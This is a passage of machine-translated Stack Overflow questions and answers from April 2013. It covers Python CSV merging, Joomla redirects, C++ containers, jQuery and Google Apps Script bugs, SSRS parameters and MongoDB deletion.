[['Lamb'],['04/01/2013'],['Welsh like lamb']]
[['Sam'],['01/12/2013'],["Sam doesn't taste as good and the last three"]]
[['Dolphin'],['01/01/2013'],['People might get angry if you eat it']]
[['Bear'],['01/04/2013'],['Best of Luck']]
[['Spinach'],['04/01/2013'],['Spinach has lots of iron']]
[['Melon'],['02/06/2013'],['Not a big fan of melon']] 
```

所以......我开始写这个：

```
import os
import csv

path = './Path/further/into/file/structure'
directory_list = os.listdir(path)
directory_list.sort()

archive = []

for file_name in directory_list:
    temp_storage = []
    path_to = path + '/' + file_name
    file_data = open(path_to, 'r')
    file_CSV = csv.reader(file_data)
    for row in file_CSV:
        temp_storage.append(row)
    for row in temp_storage[3:-1]:
        archive.append(row)

archive_file = open("./Path/elsewhere/in/file/structure/archive.csv", 'wb')
wr = csv.writer(archive_file)
for row in range(len(archive)):
    lastrow = row
    wr.writerow(archive[row])
print row 
```

这似乎有效......除了当我检查我的输出文件时，它似乎已经停止在接近末尾的一个奇怪点写入“

例如：

```
[['Spam'],['01/01/2013'],['Spam is the spammiest spam']]
[['Ham'],['01/04/2013'],['ham is ok']]
[['Lamb'],['04/01/2013'],['Welsh like lamb']]
[['Sam'],['01/12/2013'],['Sam doesn't taste as good and the last three']]
[['Dolphin],['01/01/2013'],['People might get angry if you eat it']]
[['Bear'],['01/04/2013'],['Best of Luck']]
[['Spinach'],['04/0 
```

这真的很奇怪，我无法弄清楚出了什么问题。似乎写得很好，但决定在列表条目中途停止。追溯它，我确信这与我上次写的“for循环”有关，但我不太熟悉 csv 方法。已经阅读了文档，但我仍然很难过。

谁能指出我哪里出错了，我该如何解决它，也许有更好的方法来解决这一切！

非常感谢-Huw

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-02T19:12:19.677

在脚本结束之前关闭文件句柄。关闭文件句柄也会刷新所有等待写入的字符串。如果您不刷新并且脚本结束，则某些输出可能永远不会被写入。

使用该`with open(...) as f`语法很有用，因为它会在 Python 离开`with`-suite 时为您关闭文件。使用`with`，您将永远不会忽略再次关闭文件。

```
with open("./Path/elsewhere/in/file/structure/archive.csv", 'wb') as archive_file:
    wr = csv.writer(archive_file)
    for row in archive:
        wr.writerow(row)
    print row 
```

# joomla - 如何更改已注销或未注册用户的默认重定向页面？

> ID：15772276
> 
> 赞同：1
> 
> 时间：2013-04-02T19:04:47.247
> 
> 标签：joomla, joomla1.5

正如标题所说，我想更改 Joomla 在用户注销或未注册时重定向用户的默认重定向页面。我只是找不到我应该编辑的文件。我说的是 Joomla 1.5.26 版本。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T22:56:30.350

您不必编辑任何文件。

如果您的用户正在使用`mod_login`模块**注销**，您可以在模块本身中指定**注销重定向页面**（即菜单项）。

如果您使用带有**注销**菜单项的“用户菜单”，您可以在菜单项中指定**注销重定向 URL——**注意这是一个 URL，而不是模块中的特定菜单项。

# c++ - std::vector 是否比 std::list 更容易失败（STL 容器）

> ID：15772278
> 
> 赞同：2
> 
> 时间：2013-04-02T19:04:48.933
> 
> 标签：c++, stl

我了解向量和列表之间关于它们的常见操作复杂性的区别。但是假设我们需要处理非常大的列表或向量（即数百万个元素），我们是否可以说在使用向量时内存分配更有可能失败？

AFAIK，在使用向量时，元素是连续存储的。这意味着需要分配一大块内存来存储所有元素，这在碎片堆的情况下似乎更有可能失败。

另一方面，使用列表时不会分配大块内存；元素不是连续存储的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:09:44.957

在某些情况下，`std::list`a 比 a 更有可能继续工作`std::vector`。最直接的一种是当应用程序具有大量内存碎片时。本质上，当分配分布在虚拟内存地址空间中时。这导致可用内存量与最大的连续内存块之间存在很大差距。在这种情况下，与具有相同数量的元素`std::vector`相比，具有大量元素的失败的可能性更大。`std::list`

然而，这不是我盲目地做出决定的依据。如果有问题的应用程序出现内存碎片并且影响了我使用 an 的能力，`std::vector`那么我会考虑跳到`std::list`. 但一开始我会选择我认为最适合我需要的任何系列。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-02T19:13:57.703

比较是不完整的，没有提到两个容器具有不同的每个元素的内存要求：

*   平均而言，大小的向量`N`需要`N*sizeof(T)`字节（您可能需要修剪内存以将大小精确到`N`）
*   大小列表`N`需要`N*(sizeof(T)+2*sizeof(void*))`字节。

由于列表的每个元素都带有两个额外的指针，因此非常小的对象（例如`int`s）的列表可能需要相同大小的向量所需的内存量的三到五倍。随着列表元素大小的增加，额外的内存需求变得不那么明显，但对于小对象，影响是巨大的。这就是为什么说向量更有可能在内存分配上失败是不公平的：虽然向量需要一个连续的内存块，但总量可能要小得多，让您在进入之前拥有更大尺寸的向量潜在故障的领域。

对于比两个指针大得多（例如十倍或更多）的对象，您可以放心地忽略额外的内存需求：由于需要向量来分配连续空间，找不到合适的内存块的可能性要高得多.

# asp.net - 如何找出html表格的选定行

> ID：15772279
> 
> 赞同：0
> 
> 时间：2013-04-02T19:04:54.870
> 
> 标签：asp.net

我在 asp.net 中制作了一个 html 表。用户点击一行，该记录对应的页面就会打开。我如何知道用户选择了表格的哪一行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:21:23.987

[http://www.electrictoolbox.com/jquey-make-entire-table-row-clickable/](http://www.electrictoolbox.com/jquey-make-entire-table-row-clickable/)

```
$(document).ready(function() {

    $('#example tr').click(function() {
         alert('clicked');
    });

}); 
```

[如何判断在表格中单击了哪个行号？](https://stackoverflow.com/questions/4524661/jquery-which-row-number-is-clicked-in-table)

没有jQuery

[将 onclick 事件添加到表格行](https://stackoverflow.com/questions/1207939/adding-an-onclick-event-to-a-table-row)

[http://jsbin.com/ivobe](http://jsbin.com/ivobe)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-12-18T10:12:16.290

尝试通过为其分配数据库 id 值来将 id 的自定义属性设置为 row(html)。通过单击该行，您可以通过 $(this).attr('your_custom_attr') 访问该自定义属性，并且可以使用该值进行 ajax GET 调用。

# c++ - 在 boost::property_tree 中存储类

> ID：15772280
> 
> 赞同：0
> 
> 时间：2013-04-02T19:04:58.897
> 
> 标签：c++, xml, json, boost

我正在开发一个程序来记录程序中变量的信息。我想按文件-> 函数-> 变量对这些信息进行分组。

boost::property_tree 似乎很适合这个，因为我可以将 Access 对象存储在树 ( `file.function.variable`) 的路径中，然后轻松地将树转换为 XML、JSON 等。

假设我正在记录变量的使用次数。我可以有一个 Access 类来跟踪对变量的写入和读取次数。然后我可以将此对象存储在树中的 file.function.variable 中。每次访问变量时，我都可以在树中找到变量并更新有关它的信息。

但是，我不知道如何在树中存储一个类。我认为我需要实现或子类化一些东西，但文档没有解决我想要做的事情。

我的问题有解决方案吗？有没有比 boost::property_tree 更好的选择？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:46:09.247

`boost::property_tree`旨在保存*文本数据*。这就是它适合导出到 XML、JSON 等的原因。

修改您的类`Access`，使其包含与文本相互转换并将该文本存储在树中的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T20:41:54.333

您可以放弃树的想法，而只使用键值对的平面图。

例子：

```
std::map<std::string, Access> accesses;
// add one access
accesses["file.function.variable"] += 1; 
```

您只需要编写一个从其内容生成 JSON 的例程，这应该很简单。（假设密钥的第一部分始终是文件，第二部分始终是函数，第三部分始终是变量。）

# javascript - Javascript 执行预期的操作

> ID：15772281
> 
> 赞同：0
> 
> 时间：2013-04-02T19:05:01.397
> 
> 标签：javascript, jquery, html

`<script>`每当按下按钮时，我都会将带有 javascript 和 jQuery 的标签动态添加到我的 html 文件中。一切都正确添加，但只有两个`.click`jQuery 动作函数中的一个在工作。我似乎无法弄清楚为什么。控制台没有错误。我确保我在正确的地方使用`\'`过。`\"`

```
$('#classBox').append('<tr id=\"' + tempCHAR + tempNUM + '\">' 
                + '<td>' 
                    + '<i id=\"' + tempCHAR + tempNUM + '\" class=\"icon-remove-sign\">'
                    + '</i> '
                    + '<a id=\"' + tempCHAR + tempNUM + '\"" href=\"https://cms.psu.edu/section/default.asp?id=' + urlHOLDER + '\" target="framehidden">' 
                        + tempYEAR + ': ' + tempCHAR + tempNUM + ', Section ' + tempSEC 
                    + '</a>'
                + '</td>'
            + '</tr>'
            + '<script>'
                + '$(\'#' + tempCHAR + tempNUM + '\').click(function() {'
                    + '$(\'tr\').remove(\'tr#' + tempCHAR + tempNUM + '\');'
                + '});'
                + '$(\'a#\'' + tempCHAR + tempNUM + ').click(function() {'
                    + '$(\'#framehidden\').attr(\'src\', $(\'a\', this).attr(\'href\')));'
                + '});'
            + '</script>'); 
```

缩进只是为了让我更容易阅读我正在做的事情。那不会是问题吧？

如果那太不可能阅读，那么这里是正常视图。

```
$('a#'IST130).click(function() {
    $('#framehidden').attr('src', $('a', this).attr('href')));
});  
$('#IST130').click(function() {
    $('tr').remove('tr#IST130');
}); 
```

我有 30 个其他`.click`功能都可以完美运行，但我无法弄清楚这里出了什么问题。有什么提示吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:08:00.070

您的错误（或至少其中一个）在这一行：

```
+ '$(\'a#\'' + tempCHAR + tempNUM + ').click(function() {' 
```

只需有一个额外的单引号需要移动到`$()`块的末尾：

```
+ '$(\'a#' + tempCHAR + tempNUM + '\').click(function() {' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T19:11:16.037

由于`.append()`是即时的（即同步的），因此绝对没有必要将这些东西放在`<script>`标签中。相反，试试这个：

```
$('#classBox').append('<tr id=\"' + tempCHAR + tempNUM + '\">' 
            + '<td>' 
                + '<i id=\"' + tempCHAR + tempNUM + '\" class=\"icon-remove-sign\">'
                + '</i> '
                + '<a id=\"' + tempCHAR + tempNUM + '\"" href=\"https://cms.psu.edu/section/default.asp?id=' + urlHOLDER + '\" target="framehidden">' 
                    + tempYEAR + ': ' + tempCHAR + tempNUM + ', Section ' + tempSEC 
                + '</a>'
            + '</td>'
        + '</tr>');
$('#' + tempCHAR + tempNUM).click(function() {
    $('tr').remove('tr#' + tempCHAR + tempNUM);
});
$('a#' + tempCHAR + tempNUM).click(function() {
    $('#framehidden').attr('src', $('a', this).attr('href')));
}); 
```

话虽如此，您的代码非常无效。ID 必须是唯一的。我会让你以最适合你的方式解决这个问题，但是是的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T19:10:11.193

在你最后的例子中，你有`$('a#'IST130)`. 很确定应该读`$('a#IST130`）`

要更正它，将该 ID 的生成更改为：

```
'$(\'a#' + tempCHAR + tempNUM + '\')... 
```

此外，由于您正在动态添加元素，因此它们的点击事件可能无法正确绑定，具体取决于您的代码执行的确切时间。

您可以使用[jquery on](http://api.jquery.com/on/)为永久元素上的事件设置绑定。在这种情况下`#classBox`，看起来是个不错的选择。它可能看起来像这样（这将在普通脚本块内和动态内容之外：

```
$('#classBox').on('click','a',function () {
    $('#framehidden').attr('src', $('a', this).attr('href')));
});

$('#classBox').on('click',function () {
    $(this).closest('tr').remove();
}); 
```

注意：完全未经测试 - 仅供参考！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-02T19:11:49.443

修复语法错误后，还要确保在`append()`代码运行之前未附加点击事件。

我不知道代码在实际页面中运行的顺序 - 如果您在附加点击事件之前附加元素，则这些元素可能还不存在。您可以使用 jQuery 的`delegate`方法来确保为所有元素调用事件，无论它们何时附加到 DOM。

例如：

`$('body').delegate('.anchorClassName', 'click', function(e){});`

# java - eclipse如何打包原生库

> ID：15772282
> 
> 赞同：1
> 
> 时间：2013-04-02T19:05:06.363
> 
> 标签：java, eclipse, native, lwjgl

我正在尝试从 eclipse 导出一个 slick2d 项目，我必须使用 lwjgl 库，包括它的本机，我遇到了问题。我已经尝试导出项目并且它没有将本地人放入.jar，我尝试将导入编程到程序中但它说它找不到名为 libawt.so 的东西，我认为这就是它的名字如果我设置 lwjgl.jar 的本机库，当我在 Eclipse 中运行它时工作正常，但在我导出它时却不行。有人知道我该如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:53:03.617

试试看[这个](http://www.youtube.com/watch?v=5stQZqOAM70)视频，它有一些关于如何导出应用程序的很好的说明。基本上，您只需使用 JarSplice（[在此处](http://ninjacave.com/resources/jarsplice/jarsplice-0.40.jar)下载）并运行。JarSplice 还允许您将应用程序导出为 OSX 应用程序包和 .exe 文件。

# javascript - 如何将动态 Javascript 数组放入 Google 电子表格？

> ID：15772283
> 
> 赞同：0
> 
> 时间：2013-04-02T19:05:08.687
> 
> 标签：javascript, google-apps-script, google-sheets

我已将 Javascript 代码作为以下脚本的混搭：

[https://sites.google.com/site/appsscripttutorial/miscellaneous/creating-form-elements-dynamically-using-google-apps-script-gas](https://sites.google.com/site/appsscripttutorial/miscellaneous/creating-form-elements-dynamically-using-google-apps-script-gas)

[Google Apps 脚本创建带有文件上传的表单](https://stackoverflow.com/questions/15261247/google-apps-script-create-form-with-file-upload)

当我使用 JSON.Stringify 来验证我的结果时，我得到了这个：

```
{"poNumber":"5555","vendor":"Walmart","reference":"1131","paidBy":"BofA Card","total":"15","poLines":[{"Qty":"2","Desc":"Streamers","uPrice":"6","xPrice":"10"}]} 
```

我可以使用它，但是当我尝试将数据集添加到 appendRow 函数时，我会在电子表格的最后一行得到以下输出：

```
{total=15, poLines=[Ljava.lang.Object;@7e3b6f9b, vendor=Walmart, poNumber=23454531, paidBy=Capital One Card, reference=1131} 
```

如何让电子表格读取 Ljava.lang.Object 的内容？

这是当前代码，底部有问题的代码：

```
 function doGet(e) {
  var app = UiApp.createApplication().setTitle('PO Processing');
  var panel = app.createFormPanel();
  var grid = app.createGrid(8,2).setId('poData');
  var poNumberLB = app.createLabel('PO Number');
  var poNumberTB = app.createTextBox().setId('poNumber').setWidth('150px').setName('poNumber');
  var vendorLB = app.createLabel('Vendor');
  var vendorTB = app.createTextBox().setId('vendor').setWidth('150px').setName('vendor'); 
  var referenceLB = app.createLabel('Reference/Invoice Number');
  var referenceTB = app.createTextBox().setId('reference').setWidth('150px').setName('reference'); 
  var paidByLB = app.createLabel('Paid By');
  var paidByTB = app.createListBox().setName('paidBy').setWidth('120px').setName('paidBy');
      paidByTB.addItem('On Acount');    
      paidByTB.addItem('Cash');
      paidByTB.addItem('Amex Card');  
      paidByTB.addItem('BofA Card');
      paidByTB.addItem('Capital One Card');
      paidByTB.addItem('Chase Card'); 
  var totalLB = app.createLabel('Total Invoice');
  var totalTB = app.createTextBox().setId('total').setWidth('150px').setName('total');   
  var PODetailsLabel = app.createLabel('PO Details'); var grid = app.createGrid(8,2).setId('poData');
  var poNumberLB = app.createLabel('PO Number');
  var poNumberTB = app.createTextBox().setId('poNumber').setWidth('150px').setName('poNumber');
  var vendorLB = app.createLabel('Vendor');
  var vendorTB = app.createTextBox().setId('vendor').setWidth('150px').setName('vendor'); 
  var referenceLB = app.createLabel('Reference/Invoice Number');
  var referenceTB = app.createTextBox().setId('reference').setWidth('150px').setName('reference'); 
  var paidByLB = app.createLabel('Paid By');
  var paidByTB = app.createListBox().setName('paidBy').setWidth('120px').setName('paidBy');
      paidByTB.addItem('On Acount');    
      paidByTB.addItem('Cash');
      paidByTB.addItem('Amex Card');  
      paidByTB.addItem('BofA Card');
      paidByTB.addItem('Capital One Card');
      paidByTB.addItem('Chase Card'); 
  var totalLB = app.createLabel('Total Invoice');
  var totalTB = app.createTextBox().setId('total').setWidth('150px').setName('total');   
  var PODetailsLabel = app.createLabel('PO Details');
  var table = app.createFlexTable().setId('table').setTag('0'); //Here tag will count the number of PO Lines
 //  Write the header for the table
  var headerArray = ['Quantity', 'Description', 'Unit Price', 'Extended Price'];
  for(var i=0; i<headerArray.length; i++){
    table.setWidget(0, i, app.createLabel(headerArray[i]));
  }

  //Add the first row of form elelments to input PO information
  addPORow(app);
  var submitButton = app.createButton('<B>Submit</B>'); 
  var warning = app.createHTML('<B>PLEASE WAIT WHILE DATA IS UPLOADING<B>').setStyleAttribute('background','yellow').setVisible(false)
  //file upload
  var upLoadLabel = app.createLabel('Receipt Upload');
  var upLoad = (app.createFileUpload().setName('thefile'));

  //Grid layout of items on form
  grid.setWidget(0, 0, poNumberLB)
      .setWidget(0, 1, poNumberTB)
      .setWidget(1, 0, vendorLB)
      .setWidget(1, 1, vendorTB)
      .setWidget(2, 0, referenceLB)
      .setWidget(2, 1, referenceTB)
      .setWidget(3, 0, paidByLB)
      .setWidget(3, 1, paidByTB)
      .setWidget(4, 0, totalLB)
      .setWidget(4, 1, totalTB)
      .setWidget(5, 0, PODetailsLabel)
      .setWidget(5, 1, table)
      .setWidget(6, 0, upLoadLabel)
      .setWidget(6, 1, upLoad)
      .setWidget(7, 0, submitButton)
      .setWidget(7, 1, warning)

  var cliHandler = app.createClientHandler().forTargets(warning).setVisible(true)
  submitButton.addClickHandler(cliHandler); 

  var handler = app.createServerHandler('_processSubmittedData');
  handler.addCallbackElement(panel);
  submitButton.addMouseUpHandler(handler);
  panel.add(grid)
  app.add(panel);
  return app;
}

function addPORow(app){
  var table = app.getElementById('table');
  var tag = parseInt(table.getTag());
  var numRows = tag+1;
  if(numRows >1){
    table.removeCell(numRows-1, 5);
    table.removeCell(numRows-1, 4);
  }
  table.setWidget(numRows, 0, app.createTextBox().setId('Qty'+numRows).setName('Qty'+numRows));
  table.setWidget(numRows, 1, app.createTextBox().setId('Desc'+numRows).setName('Desc'+numRows));
  table.setWidget(numRows, 2, app.createTextBox().setId('uPrice'+numRows).setName('uPrice'+numRows));
  table.setWidget(numRows, 3, app.createTextBox().setId('xPrice'+numRows).setName('xPrice'+numRows));  
  table.setTag(numRows.toString());
  addButtons(app);
}

function addButtons(app){
  var table = app.getElementById('table');
  var numRows = parseInt(table.getTag());

  //Create handler to add/remove row
  var addRemoveRowHandler = app.createServerHandler('_addRemoveRow');
  addRemoveRowHandler.addCallbackElement(table);

 //Add row button and handler
  var addRowBtn = app.createButton('+').setId('addOne').setTitle('Add row');
  table.setWidget(numRows, 4, addRowBtn);
  addRowBtn.addMouseUpHandler(addRemoveRowHandler);

  //remove row button and handler
  var removeRowBtn = app.createButton('-').setId('removeOne').setTitle('Remove row');
  table.setWidget(numRows, 5, removeRowBtn);
  removeRowBtn.addMouseUpHandler(addRemoveRowHandler);
}

function _addRemoveRow(e){
  var app = UiApp.getActiveApplication();
  var table = app.getElementById('table');
  var tag = parseInt(e.parameter.table_tag);
  var source = e.parameter.source;
  if(source == 'addOne'){
    table.setTag(tag.toString());
    addPORow(app);
  }
  else if(source == 'removeOne'){
    if(tag > 1){
      //Dcrement the tag by one
      var numRows = tag-1;
      table.removeRow(tag);
      //Set the new tag of the table
      table.setTag(numRows.toString());
      //Add buttons in previous row
      addButtons(app); 
    }
  }
  return app;
}

function _processSubmittedData(e){
  var app = UiApp.getActiveApplication();
  var result = {};
  result.poNumber = e.parameter.poNumber;
  result.vendor = e.parameter.vendor;
  result.reference = e.parameter.reference;
  result.paidBy = e.parameter.paidBy;
  result.total = e.parameter.total;
   var numPOLines = parseInt(e.parameter.table_tag);
   result.poLines = []; 
  //PO info array
  for(var i=1; i<=numPOLines; i++){
    var poLine = {};
    poLine.Qty = e.parameter['Qty'+i];
    poLine.Desc = e.parameter['Desc'+i];
    poLine.uPrice = e.parameter['uPrice'+i];
    poLine.xPrice = e.parameter['xPrice'+i];
    result.poLines.push(poLine);
  }
    // Write to spreadsheet
 var ss =  SpreadsheetApp.openById('*****samplesheet*****');
 var sheet = ss.getSheetByName('POData');
    sheet.appendRow([result]);

  // Verify String Data Set
 //var poData = JSON.stringify(result);
 //var html = app.createHTML(poData); 
 //app.add(html);

 //  File uploader to add later
 //  var fileBlob = e.parameter.thefile;
 //  var doc = DocsList.createFile(fileBlob);

    return app;

 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T20:27:51.403

最后，我只是将 JSON.stringify 参数放在了错误的位置。这是一个很好的脚本，因为我可以使用标准表单来填写“购买请求”，并将其发布到同一工作簿中的不同工作表中。它让我可以添加动态数量的采购订单行，让 Google 电子表格像数据库一样工作。它还重命名上传的文件以包含 poNumber 和发票编号，并指定保存发票的收据文件夹。

我能够让它写入电子表格并使用具有以下公式的中间电子表格过滤掉详细信息。

解析数据：

```
=split(index(POData!A:A),"[]},{") 
```

并过滤数据： `=iferror(mid(index('POfilter1'!A:BZ),find(":",index('POfilter1'!A:BZ))+2,len(index('POfilter1'!A:BZ))-find(":",index('POfilter1'!A:BZ))-2),)`

这是最后发布的最终脚本：

```
function doGet(e) {
  var app = UiApp.createApplication().setTitle('PO Processing');
  var panel = app.createFormPanel();
  var grid = app.createGrid(9,2).setId('poData');
  var poNumberLB = app.createLabel('PO Number');
  var poNumberTB = app.createTextBox().setId('poNumber').setWidth('150px').setName('poNumber');
  var vendorLB = app.createLabel('Vendor');
  var vendorTB = app.createTextBox().setId('vendor').setWidth('150px').setName('vendor'); 
  var referenceLB = app.createLabel('Reference/Invoice Number');
  var referenceTB = app.createTextBox().setId('reference').setWidth('150px').setName('reference'); 

  //Manage Payment Info Here:
  var paidByLB = app.createLabel('Paid By');
  var paidByTB = app.createListBox().setName('paidBy').setWidth('120px').setName('paidBy');
      paidByTB.addItem('On Acount');    
      paidByTB.addItem('Cash');
      paidByTB.addItem('Amex Card');  
      paidByTB.addItem('BofA Card');
      paidByTB.addItem('Captital One Card');
      paidByTB.addItem('Chase Card');  

  var totalLB = app.createLabel('Total Invoice');
  var totalTB = app.createTextBox().setId('total').setWidth('150px').setName('total');   
  var shippingLB = app.createLabel('Shipping Costs');
  var shippingTB = app.createTextBox().setId('shipping').setWidth('150px').setName('shipping');   

  var PODetailsLabel = app.createLabel('PO Details');
  var table = app.createFlexTable().setId('table').setTag('0'); //Here tag will count the number of PO Lines
 //  Write the header for the table
  var headerArray = ['Quantity', 'Description', 'Unit Price', 'Tax Exempt?'];
  for(var i=0; i<headerArray.length; i++){
    table.setWidget(0, i, app.createLabel(headerArray[i]));
  }

  //Add the first row of form elelments to input PO information
  addPORow(app);
  var submitButton = app.createSubmitButton('<B>Submit</B>'); 
  var warning = app.createHTML('<B>PLEASE WAIT WHILE DATA IS UPLOADING<B>').setStyleAttribute('background','yellow').setVisible(false)
  //file upload
  var upLoadLabel = app.createLabel('Receipt Upload');
  var upLoad = (app.createFileUpload().setName('thefile'));

  //Grid layout of items on form
  grid.setWidget(0, 0, poNumberLB)
      .setWidget(0, 1, poNumberTB)
      .setWidget(1, 0, vendorLB)
      .setWidget(1, 1, vendorTB)
      .setWidget(2, 0, referenceLB)
      .setWidget(2, 1, referenceTB)
      .setWidget(3, 0, paidByLB)
      .setWidget(3, 1, paidByTB)
      .setWidget(4, 0, shippingLB)
      .setWidget(4, 1, shippingTB)
      .setWidget(5, 0, totalLB)
      .setWidget(5, 1, totalTB)
      .setWidget(6, 0, PODetailsLabel)
      .setWidget(6, 1, table)
      .setWidget(7, 0, upLoadLabel)
      .setWidget(7, 1, upLoad)
      .setWidget(8, 0, submitButton)
      .setWidget(8, 1, warning)

  var cliHandler = app.createClientHandler().forTargets(warning).setVisible(true)
  submitButton.addClickHandler(cliHandler); 

  var handler = app.createServerHandler('_processSubmittedData');
  handler.addCallbackElement(panel);
  submitButton.addMouseUpHandler(handler);
  panel.add(grid)
  app.add(panel);
  return app;
}

function addPORow(app){
  var table = app.getElementById('table');
  var tag = parseInt(table.getTag());
  var numRows = tag+1;
  if(numRows >1){
    table.removeCell(numRows-1, 5);
    table.removeCell(numRows-1, 4);
  }
  table.setWidget(numRows, 0, app.createTextBox().setId('Qty'+numRows).setName('Qty'+numRows));
  table.setWidget(numRows, 1, app.createTextBox().setId('Desc'+numRows).setName('Desc'+numRows));
  table.setWidget(numRows, 2, app.createTextBox().setId('uPrice'+numRows).setName('uPrice'+numRows));
  table.setWidget(numRows, 3, app.createCheckBox().setId('taxExempt'+numRows).setName('taxExempt'+numRows));  
  table.setTag(numRows.toString());
  addButtons(app);
}

function addButtons(app){
  var table = app.getElementById('table');
  var numRows = parseInt(table.getTag());

  //Create handler to add/remove row
  var addRemoveRowHandler = app.createServerHandler('_addRemoveRow');
  addRemoveRowHandler.addCallbackElement(table);

 //Add row button and handler
  var addRowBtn = app.createButton('+').setId('addOne').setTitle('Add row');
  table.setWidget(numRows, 4, addRowBtn);
  addRowBtn.addMouseUpHandler(addRemoveRowHandler);

  //remove row button and handler
  var removeRowBtn = app.createButton('-').setId('removeOne').setTitle('Remove row');
  table.setWidget(numRows, 5, removeRowBtn);
  removeRowBtn.addMouseUpHandler(addRemoveRowHandler);
}

function _addRemoveRow(e){
  var app = UiApp.getActiveApplication();
  var table = app.getElementById('table');
  var tag = parseInt(e.parameter.table_tag);
  var source = e.parameter.source;
  if(source == 'addOne'){
    table.setTag(tag.toString());
    addPORow(app);
  }
  else if(source == 'removeOne'){
    if(tag > 1){
      //Dcrement the tag by one
      var numRows = tag-1;
      table.removeRow(tag);
      //Set the new tag of the table
      table.setTag(numRows.toString());
      //Add buttons in previous row
      addButtons(app); 
    }
  }
  return app;
}

function _processSubmittedData(e){
  var app = UiApp.getActiveApplication();
  var result = {};
  result.poNumber = e.parameter.poNumber;
  result.vendor = e.parameter.vendor;
  result.reference = e.parameter.reference;
  result.paidBy = e.parameter.paidBy;
  result.total = e.parameter.total;
  result.shipping = e.parameter.shipping;
   var numPOLines = parseInt(e.parameter.table_tag);
   result.poLines = []; 
  //PO info array
  for(var i=1; i<=numPOLines; i++){
    var poLine = {};
    poLine.Qty = e.parameter['Qty'+i];
    poLine.Desc = e.parameter['Desc'+i];
    poLine.uPrice = e.parameter['uPrice'+i];
    poLine.taxExempt = e.parameter['taxExempt'+i];
    result.poLines.push(poLine);
  }

  // Write to spreadsheet
 var poData = JSON.stringify(result);
 var ss =  SpreadsheetApp.openById('***Google Spreadsheet ID***');
 var sheet = ss.getSheetByName('POData');
     sheet.appendRow([poData]);
    return app;  
}

 //  File uploader
function doPost(e) {
  poNumber = e.parameter.poNumber;
  reference = e.parameter.reference;
  name = poNumber+"-"+reference;
  nameLength = name.length;
  if(nameLength ==1) {
   }
  else {
    fileName = e.parameter.thefile.name;
    var fileBlob = e.parameter.thefile;

    fileNameLength = fileName.length;
    if(fileNameLength !=0) {
      var fileDocName = name+"-"+e.parameter.thefile.name;
      var doc = DocsList.createFile(fileBlob);
      doc.rename(fileDocName);
      var folder = DocsList.getFolderById('***GDrive Folder ID***');
      doc.addToFolder(folder);
      doc.removeFromFolder(DocsList.getRootFolder());
    }
  }
 } 
```

# sql-server-2008 - 在 SSRS 中使用列表参数

> ID：15772287
> 
> 赞同：1
> 
> 时间：2013-04-02T19:05:19.480
> 
> 标签：sql-server-2008, reporting-services, ssrs-2008

我需要能够设置一个 SSRS 参数以包含多个值。

在 TSQL 中，我可以有一个`where`子句说明：

```
where Attribute in ('Value1', 'Value', 'Value3') 
```

我需要在 SSRS 中拥有：

```
where Attribute in (@Attribute) 
```

我要挂断的是如何格式化参数值表达式，以便 SQL 将其视为：`'Value1', 'Value', 'Value3'`

我有一些运气使该`where`子句仅查看第一个值，但我需要它查看所有 3。我将如何格式化表达式来做到这一点？

我只允许它接受多个值，并单独检查每个值，但我需要下拉列表来分组。因此，如果用户选择 GroupA，则`where`子句使用：`IN ('Value1', Value2')`；如果用户选择 GroupB，则`where`子句对`IN`.

希望这只是正确格式化表达式的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:18:35.163

好吧，如果您没有关于组的要求，这不会成为问题，因为您只需将参数设为多值参数，然后在数据集查询上执行`WHERE Attribute in (@Attribute)`. 但考虑到这一要求，我能想到的唯一方法是拥有两个多值参数：`@Group`和`@Attribute`. 您需要设置为`@Attribute`不可见并创建一个数据集来填充它。该数据集将是这样的：

```
SELECT Attribute
FROM Attributes
WHERE Group IN (@Group) 
```

并为您的报告数据创建另一个数据集：

```
SELECT <all your data>
FROM YourTable
WHERE Attribute IN (@Attribute) 
```

# javascript - 为什么我的新对象未定义？

> ID：15772290
> 
> 赞同：0
> 
> 时间：2013-04-02T19:05:30.240
> 
> 标签：javascript, facebook-javascript-sdk

我正在创建一个脚本来从 Facebook 流中提取某些信息并将它们插入到我创建的对象中。我希望对象看起来像这样：

```
fbObj {
        {"name": "blah", "post": "this is a post"}
        {"name": "blah_2", "post": "this is another post"}
       } 
```

这是创建该对象的好方法吗？

```
 <script language="javascript" type="text/javascript">
        function buildObject() {

           //create the object
            var fbObj = {}
            FB.api('me?fields=feed.fields(story,message,from,updated_time)', function(response) {
                console.log(response)

            //loop through feed, add items to object
        for (i = 0, l = response.feed.data.length; i < l; i++){
            var post = response.feed.data[i];
            if (post.story){
                fbObj[i].name = post.from.name
                fbObj[i].post = post.story
                console.log(fbObj[i])
                }
            if (post.message){
                fbObj[i].name = post.from.name
                fbObj[i].post =  post.message
                console.log(fbObj[i])
        }

        var x = document.getElementById("toObject");
            x.innerHTML=fbObj;
        }
        })
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:17:03.633

fbObj 像数组一样被访问，而不是对象，因此它应该被初始化：`var fbObj = []`

# mongodb - 对通过 mongodb 中的 find 语句检索到的文档执行删除

> ID：15772292
> 
> 赞同：0
> 
> 时间：2013-04-02T19:05:37.913
> 
> 标签：mongodb

是否可以对“找到的文件”执行删除？

例如类似下面的执行

```
var foundDoc = db.collection.find().limit(100);
foundDoc.remove(); 
```

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:28:06.010

`db.collection.find().limit(100).forEach(function(doc) { db.collection.remove({_id:doc._id});
});`

# r - R中的偏移函数

> ID：15772294
> 
> 赞同：1
> 
